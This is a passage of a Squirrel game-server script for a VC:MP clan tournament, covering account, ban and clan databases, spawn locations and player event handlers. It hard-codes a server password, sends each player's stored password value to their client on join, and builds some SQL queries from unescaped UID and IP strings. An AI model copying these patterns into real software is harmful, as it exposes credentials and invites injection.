class PlayerStats
{
 pass = null;
 Level = 0;
 UID = null;
 IP = null;
 AutoLogin = false;
 LoggedIn = false;
 Registered = false;
 welcomescreen = false;
 banned = false;
 spawnwep = null;
 clan = null;
 kills = 0;
 headshots = 0;
 deaths = 0;
 spree = 0;
 attack = false;
 vehaccess = false;
 Warns = 0;
 crank = null;
 team = 0;
 minigame = null;
 miniscore = 0;
 minitarget = null;
 SM = true;
}

const white = "[#FFFFFF]";
const bas = "[#FFDD33]";
const NR = "No reason including this command.";
const RequiredRounds = 2; // <- Set the required rounds to win the match here!


function onScriptLoad()
{
 DB <- ConnectSQL("databases/Registration.db");
 status <- array(GetMaxPlayers(), null);
 QuerySQL(DB, "CREATE TABLE if not exists Accounts ( Name TEXT, LowerName TEXT, Password VARCHAR ( 255 ), Level NUMERIC DEFAULT 1, TimeRegistered VARCHAR ( 255 ) DEFAULT CURRENT_TIMESTAMP, UID VARCHAR ( 255 ), IP VARCHAR ( 255 ), AutoLogin BOOLEAN DEFAULT true, Banned TEXT, clan VARCHAR ( 255 ), Kills VARCHAR ( 255 ), Headshots VARCHAR ( 255 ), Deaths VARCHAR ( 255 ), lastjoined VARCHAR ( 255 ) ) ");
 QuerySQL(DB," create table if not exists kicked ( name VARCHAR ( 255 ), admin VARCHAR ( 255 ), date VARCHAR ( 255 ), reason VARCHAR ( 255 ) ) ");
 QuerySQL(DB," create table if not exists warn ( name VARCHAR ( 255 ), admin VARCHAR ( 255 ), date VARCHAR ( 255 ), reason VARCHAR ( 255 ) ) ");
 QuerySQL(DB," create table if not exists slap ( name VARCHAR ( 255 ), admin VARCHAR ( 255 ), date VARCHAR ( 255 ), reason VARCHAR ( 255 ) ) ");
 QuerySQL(DB, "create table if not exists staff (name VARCHAR ( 255 ), rank VARCHAR ( 255 ), madeby VARCHAR ( 255 ) ) "); 
 QuerySQL( DB, "CREATE TABLE IF NOT EXISTS AdminLog ( Admin VARCHAR ( 255 ), Level NUMERIC DEFAULT 1, Player VARCHAR ( 255 ), Date VARCHAR ( 255 ), Command TEXT, Reason VARCHAR ( 255 ) ) " );
 QuerySQL(DB, "CREATE TABLE if not exists Unregistered ( Name TEXT, LowerName TEXT, UID VARCHAR ( 255 ), IP VARCHAR ( 255 ), lastjoined VARCHAR ( 255 ) ) ");
 print("Registeration System Loaded");

 clan <- ConnectSQL("databases/clans.db");
 QuerySQL(clan, "create table if not exists registered ( name VARCHAR ( 255 ), tag VARCHAR ( 255 ) ) ");
 QuerySQL(clan, "CREATE TABLE if not exists members ( name VARCHAR ( 255 ), tag VARCHAR ( 255 ), player VARCHAR ( 255 ), tgroup INTEGER, rank INTEGER ) ");
 print("Clan System Loaded");
 
 ban <- ConnectSQL("databases/ban.db");
 QuerySQL(ban, "create table if not exists nameban ( name VARCHAR ( 255 ), admin VARCHAR ( 255), date VARCHAR(255), reason VARCHAR(255)) ");
 QuerySQL(ban, "create table if not exists nameunban ( name VARCHAR ( 255 ), badmin VARCHAR(255), admin VARCHAR (255), date VARCHAR(255), breason VARCHAR(255)) ");
 QuerySQL(ban, "create table if not exists tempban ( name VARCHAR ( 255 ), admin VARCHAR ( 255), date VARCHAR(255), UID VARCHAR ( 255 ), duration VARCHAR(255), expire VARCHAR(255), reason VARCHAR(255)) ");
 QuerySQL(ban, "create table if not exists temunbanned ( name VARCHAR ( 255 ), badmin VARCHAR(255), admin VARCHAR ( 255), duration VARCHAR(255), date VARCHAR(255), breason VARCHAR(255)) ");
 QuerySQL(ban, "create table if not exists permaban ( name VARCHAR ( 255 ), admin VARCHAR ( 255), date VARCHAR(255), UID VARCHAR(255), reason VARCHAR(255)) ");
 QuerySQL(ban, "create table if not exists permaunban ( name VARCHAR ( 255 ), badmin VARCHAR(255), admin VARCHAR ( 255), date VARCHAR(255), breason VARCHAR(255)) ");

 AddClass( 1, RGB( 249, 255, 135 ), 15, Vector( -657.091, 762.422, 11.5998 ), -3.13939, 21, 999 ,1, 1, 25, 255 );
    AddClass( 2, RGB( 100, 149, 237 ), 1, Vector( -657.091, 762.422, 11.5998 ), 0.00513555, 21, 999 ,1, 1, 25, 255 );
    AddClass( 3, RGB( 200, 0, 0 ), 5, Vector( -657.091, 762.422, 11.5998 ), -3.1172, 21, 999 ,1, 1, 25, 255 );
    AddClass( 4, RGB( 23, 135, 34 ), 48, Vector( -657.091, 762.422, 11.5998 ), -3.13939, 21, 999 ,1, 1, 25, 255 );
    AddClass( 5, RGB( 211, 211, 211 ), 84, Vector( -657.091, 762.422, 11.5998 ), -3.13939, 21, 999 ,1, 1, 25, 255 );
	GGlocs <- ["-128.821 488.705 13.4961", "-166.972 608.88 13.5054", "-240.9 552.673 13.9821", "-241.094 466.62 14.9759", "-187.274 447.715 13.9719", "-73.6621 512.677 11.8284", "-195.861 507.561 16.4494"];



	myDiscord <- CDiscord();
	myDiscord.Connect(myDiscord.BotToken);








	pUpdateTimer <- NewTimer("Update", 1000/30, 0 );
	KEY_W <- BindKey( true, 0x57, 0, 0 );
	KEY_A <- BindKey( true, 0x41, 0, 0 );
	KEY_S <- BindKey( true, 0x53, 0, 0 );
	KEY_D <- BindKey( true, 0x44, 0, 0 );
	KEY_UP <- BindKey( true, 0x26, 0, 0);
	KEY_LEFT <- BindKey( true, 0x25, 0, 0 );
	KEY_RIGHT <- BindKey( true, 0x27, 0, 0 );
	KEY_DOWN <- BindKey( true, 0x28, 0, 0 );
	KEY_SPACEBAR <- BindKey( true, 0x20, 0, 0 );
	KEY_Y <- BindKey( true, 0x59, 0, 0 );
	KEY_N <- BindKey( true, 0x4E, 0, 0 );
	SetPassword( "Makingvcmpgreat2018" );
	CreateObject( 314, 2, Vector( -1010.59, 199.92, 11.2893 ), 0) .RotateToEuler( Vector( 0, 0, 1.45 ), 1 );
	CreateObject( 314, 2, Vector( 138.682, -1369.6, 13.1827 ), 0 );
	CreateObject( 314, 2, Vector( -791.667, 410.613, 12.6254 ), 0 ).RotateToEuler( Vector( 0, 0, 1.55 ), 1 );
	CreateObject( 306, 2, Vector( -913.343, 425.257, 9.24396 ), 0 ).RotateToEuler( Vector( 0, 0, 1.5 ),1 );
	CreateObject( 306, 2, Vector( -938.339, 427.654, 9.89591 ), 0 ).RotateToEuler( Vector( -6.58201e-008, 5.56856e-008, 1.45 ),1 );
	CreateObject( 306, 2, Vector( -1019.08, 415.757, 10.1074 ), 0 ).RotateToEuler( Vector( 0, 0, 0 ), 1 );
	CreateObject( 306, 2, Vector( -1019.12, 390.737, 9.94547 ), 0 ).RotateToEuler( Vector( 0, 0, 0 ), 1);
	CreateObject( 314, 2, Vector( -969.878, 369.233, 12.7629 ), 0 ).RotateToEuler( Vector( 0, 0, 0 ), 1 );
	CreateObject( 314, 2, Vector( -1721.25, -293.256, 14.8683 ), 0 ).RotateToEuler( Vector( 0, 0, 0 ), 1 );
	CreateObject( 311, 2, Vector( -1702.12, -288.036, 14.8683 ), 0 ).RotateToEuler( Vector( 0, 0, -1.4 ), 1 );
	CreateObject( 314, 2, Vector( -1749.68, -281.176, 14.8683 ), 0 ).RotateToEuler( Vector( 0, 0, -1.15 ), 1 );
	CreateObject( 306, 2, Vector( -1096.19, -1433.05, 10.6833 ), 0 ).RotateToEuler( Vector( 1.434e-008, -1.23838e-008, -0.45 ), 1 );
	CreateObject( 314, 2, Vector( -1097.49, -1443.87, 13.7177 ), 0 ).RotateToEuler( Vector( 0, 0, 1.1 ), 1 );
	CreateObject( 314, 2, Vector( -1166.73, -1415.47, 13.7843 ), 0 ).RotateToEuler( Vector( 0, 0, 1.15 ), 1 );
	CreateObject( 306, 2, Vector( -1014.19, -1240.63, 9.98414 ), 0 ).RotateToEuler( Vector( 0, 0, -0.45 ), 1 );
	CreateObject( 314, 2, Vector( -1003.69, -1226.19, 12.7158 ), 0 ).RotateToEuler( Vector( 0, 0, 1.15 ), 1 );
	CreateObject( 306, 2, Vector( -414.617, 1230.54, 9.68468 ), 0 ).RotateToEuler( Vector( 0, 0, 0.2 ), 1 );
	CreateObject( 306, 2, Vector( -412.421, 1218.42, 10.037 ), 0 ).RotateToEuler( Vector( 0, 0, 0 ), 1 );
	CreateObject( 306, 2, Vector( -459.166, 1239.01, 10.267 ), 0 ).RotateToEuler( Vector( 0, 0, 1.5 ), 1 );
	CreateObject( 306, 2, Vector( -492.02, 1160.28, 10.1998 ), 0 ).RotateToEuler( Vector( 0, 0, 1 ), 1 );
	CreateObject( 314, 2, Vector( -479.484, 1154.51, 12.5712 ), 0 ).RotateToEuler( Vector( 0, 0, -0.85 ), 1 );
	CreateObject( 306, 2, Vector( -415.5, 1149.21, 10.037 ), 0 ).RotateToEuler( Vector( 0, 0, -0.75 ), 1 );
	CreateObject( 306, 2, Vector( -568.944, 765.141, 190.463 ), 0 ).RotateToEuler( Vector( -1.56232, 0.665018, 0.0214611 ),1 )
	CreateObject( 306, 2, Vector( -568.617, 823.206, 190.463 ), 0 ).RotateToEuler( Vector( -1.56631, -0.684798, 0.00213722 ),1 );
	CreateObject( 306, 2, Vector( -509.023, 761.47, 194.213 ), 0 ).RotateToEuler( Vector( 0, 0, -1 ),1 )
	CreateObject( 306, 2, Vector( -530.771, 756.054, 194.213 ), 0 ).RotateToEuler( Vector( 0, 0, -1.55 ),1 )
	CreateObject( 306, 2, Vector( -555.94, 755.939, 194.213 ), 0 ).RotateToEuler( Vector( 0, 0, -1.55 ),1 )
	CreateObject( 306, 2, Vector( -574.825, 756.754, 194.213 ), 0 ).RotateToEuler( Vector( 0, 0, 0.75 ),1 )
	CreateObject( 306, 2, Vector( -583.778, 776.093, 193.963 ), 0 ).RotateToEuler( Vector( 0, 0, 3.72529e-009 ),1 )
	CreateObject( 306, 2, Vector( -583.784, 800.887, 194.213 ), 0 ).RotateToEuler( Vector( 0, 0, 0 ),1 )
	CreateObject( 306, 2, Vector( -576.832, 825.196, 193.963 ), 0 ).RotateToEuler( Vector( 0, 0, -0.7 ),1 )
	CreateObject( 306, 2, Vector( -555.39, 831.133, 194.213 ), 0 ).RotateToEuler( Vector( 3.14159, 3.14159, 1.54159 ),1 )
	CreateObject( 306, 2, Vector( -534.945, 837.708, 194.463 ), 0 ).RotateToEuler( Vector( 0, 0, -1.55 ),1 )
	CreateObject( 306, 2, Vector( -505.75, 830.838, 194.463 ), 0 ).RotateToEuler( Vector( 0, 0, 1.55 ),1 )
	CreateObject( 306, 2, Vector( -488.771, 816.722, 194.213 ), 0 ).RotateToEuler( Vector( 0, 0, 0.55 ),1 )
	CreateObject( 314, 2, Vector( -494.034, 831.655, 195.713 ), 0 ).RotateToEuler( Vector( -1.54099, -1.00344, -0.0188182 ),1 )
	CreateObject( 306, 2, Vector( -493.295, 816.966, 196.463 ), 0 ).RotateToEuler( Vector( 1.5652, -0.50979, 0.008909),1 )
	CreateObject( 306, 2, Vector( -510.084, 758.535, 190.463 ), 0 ).RotateToEuler( Vector( -1.55603, -0.960475, -0.012416 ),1 )
	FirstCPosLocBF <- [
		Vector( -944.223 ,405.314 ,11.2486 ),
		Vector( -943.815 ,399.459 ,11.2509 ),
		Vector( -943.764 ,391.716 ,11.2541 ),
		Vector( -950.014 ,394.175 ,11.2531 ),
		Vector( -949.531 ,400.779 ,11.2504 )
	];
	SecondCPosLocBF <- [
		Vector( -896.585 ,400.708 ,11.0801 ),
		Vector( -896.969 ,395.127 ,11.14 ),
		Vector( -897.348 ,389.644 ,11.1371 ),
		Vector( -891.782 ,391.109 ,11.1143 ),
		Vector( -891.812 ,395.592 ,11.1055 )
	];
	FirstCPosLocArmy <- [
		Vector( -1721.69 ,-267.066 ,14.8683 ),
		Vector( -1725.99 ,-266.898 ,14.8683 ),
		Vector( -1714.61 ,-267.338 ,14.8683 ),
		Vector( -1716.23 ,-272.485 ,14.8683 ),
		Vector( -1722.34 ,-272.271 ,14.8683 )
	];
	SecondCPosLocArmy <- [
		Vector( -1719.94 ,-229.492 ,14.8683 ),
		Vector( -1714.42 ,-229.658 ,14.8683 ),
		Vector( -1725.95 ,-229.64 ,14.8683 ),
		Vector( -1724.78 ,-225.611 ,14.8683 ),
		Vector( -1718.4 ,-225.839 ,14.8683 )
	];
	FirstCPosLocDocks <- [
		Vector( -1100.5 ,-1337.44 ,11.4258 ),
		Vector( -1094.49 ,-1339.96 ,11.4959 ),
		Vector( -1108.52 ,-1331.7 ,11.3074 ),
		Vector( -1107.71 ,-1338.43 ,11.3642 ),
		Vector( -1102.07 ,-1341.87 ,11.443 )
	];
	SecondCPosLocDocks <- [
		Vector( -1071.91 ,-1271.17 ,11.2165 ),
		Vector( -1079.46 ,-1268.6 ,11.1867 ),
		Vector( -1064.66 ,-1276.29 ,11.2989 ),
		Vector( -1066.4 ,-1269.76 ,11.2589 ),
		Vector( -1073.83 ,-1267.31 ,11.178 )
	];
	FirstCPosLocParkingLot <- [
		Vector( -458.126 ,1217.24 ,9.68458 ),
		Vector( -452.883 ,1217.14 ,9.68458 ),
		Vector( -466.111 ,1216.94 ,9.68458 ),
		Vector( -463.187 ,1220.35 ,9.68458 ),
		Vector( -457.503 ,1220.23 ,9.68458 )
	];
	SecondCPosLocParkingLot <- [
		Vector( -461.674 ,1183.51 ,9.68458 ),
		Vector( -467.819 ,1183.96 ,9.68458 ),
		Vector( -454.317 ,1183.89 ,9.68458 ),
		Vector( -457.381 ,1180.13 ,9.68458 ),
		Vector( -463.886 ,1180.49 ,9.68458 )
	];
	FirstCPosLocLegend <- [
		Vector( -533.102 ,824.547 ,195.213 ),
		Vector( -539.975 ,824.831 ,195.213 ),
		Vector( -524.882 ,822.906 ,195.213 ),
		Vector( -528.194 ,826.969 ,195.213 ),
		Vector( -535.321 ,827.31 ,195.213 )
	];
	SecondCPosLocLegend <- [
		Vector( -534.315 ,774.065 ,195.213 ),
		Vector( -527.913 ,773.964 ,195.213 ),
		Vector( -542.318 ,775.423 ,195.213 ),
		Vector( -537.539 ,771.543 ,195.213 ),
		Vector( -531.373 ,771.153 ,195.213 )
	];
	LocBFCameraPositions <- {
		CameraLookPos = Vector( -927.777 ,399.073 ,11.247 ),
		CamerasPos = [ Vector( -935.97 ,430.422 ,24.9979 ), Vector( -861.56 ,376.553 ,22.8127 ), Vector( -965.617 ,375.588 ,22.8403 ) ],
		RenderLoc = Vector( -850.503, 499.017, 15.9285 )
	}
	LocArmyCameraPositions <- {
		CameraLookPos = Vector( -1722.67 ,-248.551 ,14.8683 ),
		CamerasPos = [ Vector( -1698.6 ,-210.59 ,31.9292 ), Vector( -1723.86 ,-312.664 ,36.6515 ), Vector( -1761.09 ,-265.454 ,30.6272 ) ],
		RenderLoc = Vector( -1616.87, -221.455, 28.3622 )
	}
	LocDocksCameraPositions <- {
		CameraLookPos = Vector( -1089.7, -1314.95, 11.3653 ),
		CamerasPos = [ Vector( -1134.08 ,-1344.78 ,30.5625 ), Vector( -1100.74 ,-1239.59 ,27.3181 ), Vector( -1026.51 ,-1270.58 ,41.74 ) ],
		RenderLoc = Vector( -1128.36, -1224.86, 14.9238 )
	}
	LocPLCameraPositions <- {
		CameraLookPos = Vector( -459.726 ,1192.15 ,9.68458 ),
		CamerasPos = [ Vector( -487.526 ,1233.31 ,26.4135 ), Vector( -421.89 ,1199.01 ,11.4402 ), Vector( -436.821 ,1142.22 ,40.1701 ) ],
		RenderLoc = Vector( -468.842, 1252.76, 79.751 )
	}
	LocLegendCameraPositions <- {
		CameraLookPos = Vector( -531.151 ,792.627 ,195.213 ),
		CamerasPos = [ Vector( -506.902 ,755.075 ,214.213 ), Vector( -597.196 ,754.567 ,225.303 ), Vector( -562.989 ,851.052 ,207.477 ) ],
		RenderLoc = Vector( -527.868, 799.931, 97.5104 )
	}
	MainCamera <- {
		CameraLookPos = Vector( 495.486, -1625.17, 25.06831 ),
		CameraPos = Vector( 566.165, -1795.44, 18.82471 )
	}
	staffloc <- Vector( 140.287, -1367.48, 13.8592 );
	clansloc <- Vector( -991.786, 199.831, 15.2197 );
	funmessages <- [ "Hey hey, hands up because it's ", "Yo, it's ", "Say what? It's ", "All hail ", "Give it up for ", "Hooray! We've ", "Well, well, well. Isn't it ", "Welcome to the party, ", "Greetings ", "Hellow " ];
	TPTimeRunning <- array( GetMaxPlayers(), false );

	}

function onScriptUnload()
{
}
function Update()
{
	for ( local i = 0; i < pCamera.len(); i++ )
	{
		if( pCamera[i] )
		{
			if( pCamera[i].bEnabled ) pCamera[i].Process();
		}
	}
}
function onPlayerJoin( player )
{
	status[player.ID] = PlayerStats();
	AccInfo(player);
    local FN = funmessages[ rand() % funmessages.len() ];
    Message( "[#FFDD33][Info][#FFFFFF] "+ FN + player.Name +"." );
	pCamera[ player.ID ] = CCamera();  
	pCamera[ player.ID ].Player = FindPlayer( player.ID );
	checkban(player);
	MessagePlayer("[#FFDD33]Information:[#FFFFFF] Level: "+status[player.ID].Level+" ("+checklvl(status[player.ID].Level)+")", player);
	SendDiscord(channel, "**"+player.Name+"** joined the server.");

	local a,b,c;
	if(status[player.ID].Registered) a = 1; else a = 0;
	if(status[player.ID].LoggedIn == true) b = 1; else b = 0;
	c = player.Name+" "+a+" "+b+" "+status[player.ID].pass;
	NewTimer("SendDataToClient", 500, 1, player, 10, c);
	MessagePlayer("data sent", player);

}



function checkban(player)
{
	local q = QuerySQL(ban, "SELECT * FROM nameban WHERE name = '"+escapeSQLString(player.Name.tolower())+"'");
	local q2 = QuerySQL(ban, "SELECT * FROM permaban WHERE UID = '"+player.UID+"'");
	local q3 = QuerySQL(ban, "SELECT * FROM tempban WHERE UID = '"+player.UID+"'");
	if(q)
	{
		Announce("~y~Banned", 8, player);
		MessagePlayer("[#FFDD33]Information:[#FFFFFF] Banned from Server by Admin: [#D3D3D3]"+GetSQLColumnData(q, 1)+white+" Reason: ["+GetSQLColumnData(q, 0)+"] "+GetSQLColumnData(q, 3)+".", player);
		MessagePlayer("[#FFDD33]Information:[#FFFFFF] If you think that you are wrongfully banned, make an admin report on our forum: ", player);
		KickPlayer(player);
	}
	if(q2)
	{
		Announce("~y~Banned", 8, player);
		MessagePlayer("[#FFDD33]Information:[#FFFFFF] Banned from Server by Admin: [#D3D3D3]"+GetSQLColumnData(q2, 1)+"[#FFFFFF] Reason: ["+GetSQLColumnData(q2, 0)+"] "+GetSQLColumnData(q2, 4)+".", player);
		MessagePlayer("[#FFDD33]Information:[#FFFFFF] If you think that you are wrongfully banned, make an admin report on our forum: ", player);
		KickPlayer(player);
	}
	if(q3)
	{
		if(!checktempban(GetSQLColumnData(q3, 5)))
		{
			Announce("~y~Banned", 8, player);
			MessagePlayer("[#FFDD33]Information:[#FFFFFF] Banned from Server by Admin: [#D3D3D3]"+GetSQLColumnData(q3, 1)+"[#FFFFFF] Reason: ["+GetSQLColumnData(q3, 0)+"] "+GetSQLColumnData(q3, 6)+".", player);
			MessagePlayer("[#FFDD33]Information:[#FFFFFF] If you think that you are wrongfully banned, make an admin report on our forum: ", player);
			MessagePlayer("[#FFDD33]Information:[#FFFFFF] You are banned till: "+GetSQLColumnData(q3, 5)+".", player);
			KickPlayer(player);
		
		}
		else
		{
			removetempban(player.UID);
		}
	}
}
function AccInfo(player)
{
	local q = QuerySQL(DB, "SELECT * FROM Accounts WHERE LowerName = '" + escapeSQLString(player.Name.tolower()) + "'");
	if (!q)
	{
		MessagePlayer("[#FFDD33] Welcome to the [#FFFF00]VCMP Clan Tournament 2018[#FFFFFF].", player);
		MessagePlayer("[#FFDD33]Information:[#FFFFFF]  Your nick is [#FF0000]not [#FFFFFF]registered. Please use /"+bas+"register[#FFFFFF] in order to access services.", player);
		local q2 = QuerySQL(DB, "SELECT * FROM Unregistered WHERE LowerName = '"+escapeSQLString(player.Name.tolower())+"'");
		if(!q2)
		{
			QuerySQL(DB, "INSERT INTO Unregistered (Name, LowerName, UID, IP) VALUES ('"+escapeSQLString(player.Name)+"', '"+escapeSQLString(player.Name.tolower())+"', '"+player.UID+"', '"+player.IP+"') ");
		}
	}
	else
	{
		if(GetSQLColumnData(q, 0) != escapeSQLString(player.Name)) MessagePlayer("[#FF0000]Warning"+white+": Any Capital/small letter of your name doesn't match the database. Please transfer your stats in order to avoid bugs.", player); 
		status[player.ID].pass = GetSQLColumnData(q, 2);
		status[player.ID].Level = GetSQLColumnData(q, 3);
		status[player.ID].UID = GetSQLColumnData(q, 5);
		status[player.ID].IP = GetSQLColumnData(q, 6);
		status[player.ID].AutoLogin = GetSQLColumnData(q, 7);
		status[player.ID].Registered = true;
		status[player.ID].banned = GetSQLColumnData(q, 8);
		status[player.ID].clan = GetSQLColumnData(q, 9);
		status[player.ID].kills = GetSQLColumnData(q, 10).tointeger();
		status[player.ID].headshots = GetSQLColumnData(q, 11).tointeger();
		status[player.ID].deaths = GetSQLColumnData(q, 12).tointeger();
		local sq = QuerySQL(clan, "SELECT * FROM members WHERE name = '"+escapeSQLString(player.Name.tolower())+"'");
		if(sq) status[player.ID].crank = GetSQLColumnData(sq, 4).tointeger();
		if ((player.UID == status[player.ID].UID) || (player.IP == status[player.ID].IP))
		{
			if (status[player.ID].AutoLogin == "true")
			{
				status[player.ID].LoggedIn = true;
				MessagePlayer("[#FFDD33] Welcome to the [#FFFF00]VCMP Clan Tournament 2018[#FFFFFF].", player);
				MessagePlayer("[#FFDD33] Use /credits to see the creators of the Server[#FFFFFF].", player);
				if(status[player.ID].clan != null)
				{
					MessagePlayer("[#FFDD33] Clan : "+status[player.ID].clan+".", player);
				}
			}
		}
	}
}




function onPlayerPart( player, reason )
{
	local now = date();
	local dat = now.day + "/" + now.month + "/" + now.year + " " + now.hour + ":" + now.min + ":" + now.sec;
	QuerySQL(DB, "UPDATE Accounts SET lastjoined = '"+dat+"' WHERE LowerName = '"+escapeSQLString(player.Name.tolower())+"'");
	QuerySQL(DB, "UPDATE Unregistered SET lastjoined = '"+dat+"' WHERE LowerName = '"+escapeSQLString(player.Name.tolower())+"'");
    local playerName = pcol( player.ID ) + player.Name + white;
	if( _GG.Players.find( player.ID ) != null )
	{
		_GG.PartGG( player );
	}
	if( _FR.Players.find( player.ID ) != null )
	{
		_FR.PartFR( player );
	}
    switch ( reason )
    {
      case 1:
      {
        Message( "[#FFDD33][Info][#FFFFFF] "+ playerName +" has left the server (quit)." );
        break;
      }
      case 0:
      {
        Message( "[#FFDD33][Info][#FFFFFF] "+ playerName +" has left the server (timeout)." );
        break;
      }
      case 2:
      {
        Message( "[#FFDD33][Info][#FFFFFF] "+ playerName +" has left the server (kicked)." );
        break;
      }
      case 3:
      {
        Message( "[#FFDD33][Info][#FFFFFF] "+ playerName +" has left the server (crashed)." );
        break;
      }
    }
//    if ( status[ player.ID ].LoggedIn == true ) QuerySQL( DB, "UPDATE Accounts SET Level = '"+ status[ player.ID ].Level +"', IP = '"+ status[ player.ID ].IP +"', UID = '"+ status[ player.ID ].UID +"', Kills = '"+ status[ player.ID ].kills +"', Deaths = '"+ status[ player.ID ].deaths +"' WHERE Name LIKE '"+ player.Name +"'" );
    status[ player.ID ] = null;
	SendDiscord(channel, "**"+player.Name+"** left the server.");
}

 function onPlayerRequestClass( player, classID, team, skin )
{
	if(status[player.ID].welcomescreen == false) return;
	else
	{
		switch ( player.Team )
		{
			case 1:
				Announce( "~y~Team Yellow - Free", player, 8 );
			break;
			case 2:
				Announce( "~b~Team Blue - Tournament Participant Group 1", player, 8 );
			break;
			case 3:
				Announce( "~o~Team Red - Tournament Group 2", player, 8 );
			break;
			case 4:
				Announce( "~t~Team Green - Referee", player, 8 );
			break;
			case 5:
				Announce( "~h~Team White - Administrators", player, 8 );
			break;
		}
		return 1;
	}
}	

function onPlayerRequestSpawn( player )
{
	if(status[player.ID].welcomescreen == false) return;
	else
	{
		if(!status[player.ID].Registered)
		{
			MessagePlayer("[#FF0000]Error:[#FFFFFF] You need to be registerd before spawning", player);
			return 0;
		}
		else if(!status[player.ID].LoggedIn)
		{
			MessagePlayer("[#FF0000]Error:[#FFFFFF] You need to be logged in before spawning.", player);
			return 0;
		}
		else
		{
			local lvl = status[player.ID].Level;
			if(lvl < 2 && player.Team != 1) 
			{
				MessagePlayer("[#FF0000]Error:[#FFFFFF] You are neither a tournament participant nor referee so you cannot spawn with the team. Take Team Yellow.", player);
				return 0;
			}
			else if(lvl == 2 &&(player.Team == 3 ||  player.Team == 4 ||  player.Team == 5))
			{
				MessagePlayer("[#FF0000]Error:[#FFFFFF] You are in Tournament Group 1. You can only spawn will Team Yellow or Blue.", player);
				return 0;
			}
			else if(lvl == 3 &&( player.Team == 2 || player.Team == 4 ||  player.Team == 5))
			{
				MessagePlayer("[#FF0000]Error:[#FFFFFF] You are in Tournament Group 2. You can only spawn will Team Yellow or Red.", player);
				return 0;
			}
			else if(lvl == 4 &&(player.Team == 2 || player.Team == 3 || player.Team == 5))
			{
				MessagePlayer("[#FF0000]Error:[#FFFFFF] You are a referee. You can only spawn will Team Yellow or Green.", player);
				return 0;
			}
			else return 1;
		}
	}
}

function onPlayerSpawn( player )
{
if(status[player.ID].minigame != null)
{
	player.IsFrozen = true;
	player.CanAttack = true;
	NewTimer("miniround", 2000, 1, player.ID);
	NewTimer("GGchangepos", 3000, 1, player.ID);	

}
status[player.ID].team = player.Team.tointeger();
	if(status[player.ID].attack == true) player.CanAttack = true;
	else player.CanAttack = false;
	if(status[player.ID].spawnwep != null) setspawnwep(player.ID, status[player.ID].spawnwep);
	if( CBattle.TPlayers.find( player.ID ) != null )
	{
		player.Pos = clansloc;
		player.CanAttack = false;
	}
	else
	{
		if(player.Team == 1)
		{
			player.GiveWeapon(9, 9999);
			player.GiveWeapon(15, 9999);
			player.GiveWeapon(18, 9999);
			player.GiveWeapon(19, 9999);
			player.GiveWeapon(102, 9999);
			player.GiveWeapon(32, 9999);
			player.GiveWeapon(103, 9999);
			player.GiveWeapon(24, 9999);
		}
	
	
	
		if(player.Team == 2)
		{
			player.GiveWeapon(4, 9999);
		 player.GiveWeapon(12, 9999);
		 player.GiveWeapon(17, 9999);
		 player.GiveWeapon(21, 9999);
		 player.GiveWeapon(27, 9999);
		 player.GiveWeapon(28, 9999);
		 player.GiveWeapon(31, 9999);
		 player.GiveWeapon(22, 9999);
	}

	

	if(player.Team == 3)
	{
		 player.GiveWeapon(6, 9999);
		 player.GiveWeapon(12, 9999);
		 player.GiveWeapon(18, 9999);
		 player.GiveWeapon(20, 9999);
		 player.GiveWeapon(26, 9999);
		 player.GiveWeapon(32, 9999);
		 player.GiveWeapon(29, 9999);
		 player.GiveWeapon(23, 9999);
	}


	
	if(player.Team == 4)
	{
		 player.GiveWeapon(11, 9999);
		 player.GiveWeapon(13, 9999);
		 player.GiveWeapon(18, 9999);
		 player.GiveWeapon(20, 9999);
		 player.GiveWeapon(26, 9999);
		 player.GiveWeapon(32, 9999);
		 player.GiveWeapon(29, 9999);
		 player.GiveWeapon(25, 9999);
	}
	if(player.Team == 5)
	{
		 player.GiveWeapon(11, 9999);
		 player.GiveWeapon(13, 9999);
		 player.GiveWeapon(18, 9999);
		 player.GiveWeapon(20, 9999);
		 player.GiveWeapon(26, 9999);
		 player.GiveWeapon(32, 9999);
		 player.GiveWeapon(29, 9999);
		 player.GiveWeapon(25, 9999);
	}
	}
}

function setspawnwep(p, text)
{
	local player = FindPlayer(p);
	if(!player) return;
	else
	{
			local params = split( text, " " ); 
			player.SetWeapon(0,0);
			local weapons; // Create a new null variable which will be holding the list of weapons player took.
			local b;
			b = 0;
			for( local i = 0; i <= params.len() - 1; i++ ) // since the 'len' returns value from 1 and array's starting value point is 0, we will use len() - 1 otherwise we'll receive an error.
			{
				if( !IsNum( params[i] ) && GetWeaponID( params[i]) && GetWeaponID( params[i]) > 0 && GetWeaponID( params[i]) <= 32 ) // if Name was specified. 
				{
					player.SetWeapon( GetWeaponID( params[i] ), 99999 ); // Get the weapon ID from its Name
					if(b == 0)
					{
						weapons = GetWeaponName(GetWeaponID(params[i])); // Add the weapon name to given weapon list
						b=b+1;
					}
					else
					{
						weapons = weapons + ", " + GetWeaponName(GetWeaponID(params[i]));
					}

				}
	
				else if( IsNum( params[i] ) && params[i].tointeger() < 33 && params[i].tointeger() > 0  ) // if ID was specified
				{
					player.SetWeapon( params[i].tointeger(), 99999 ); // Then just give player that weapon
					weapons = GetWeaponName( params[i].tointeger() ); // Get the weapon name from the ID and add it.
					if(b == 0)
					{
						weapons = GetWeaponName( params[i].tointeger() ); // Add the weapon name to given weapon list
						b=b+1;
					}
					else
					{
						weapons = weapons + ", " + GetWeaponName( params[i].tointeger() );
					}
					
				}
			}
			if(weapons != null) MessagePlayer("[#FFDD33]Information:[#FFFFFF] You received the following weps : "+weapons+".", player);
	
	}
}
function onPlayerDeath( player, reason )
{
    local playerName = pcol( player.ID ) + player.Name + white;
	if( CBattle.State == "STARTED" && CBattle.TPlayers.find( player.ID ) != null ) CBattle.PartCB( player );
    switch (reason)
    {
        case 44:
        {
            Message( "[#FFDD33][Info][#FFFFFF] "+ playerName +" tripped to death." );
            break;
        }
        case 41:
        {
            Message( "[#FFDD33][Info][#FFFFFF] "+ playerName +" died from an explosion impact." );
            break;
        }
        case 43:
        {
            Message( "[#FFDD33][Info][#FFFFFF] "+ playerName +" drank too much water." );
            break;
        }
        case 39:
        {
            Message( "[#FFDD33][Info][#FFFFFF] "+ playerName +" doesn't watch where he's going in the sidewalk." );
            break;
        }
        case 70:
        {
            Message( "[#FFDD33][Info][#FFFFFF] "+ playerName +" suicided. :[" );
            break;
        }
    }
		if(_GG.Players.find(player.ID) != null)
		{
			NewTimer("miniroundspawn", 8000, 1, player.ID)
		}
		if( _FR.Players.find(player.ID) != null)
		{
			NewTimer("miniroundspawn", 8000, 1, player.ID)
			_FR.deathFR(player.ID);
		}
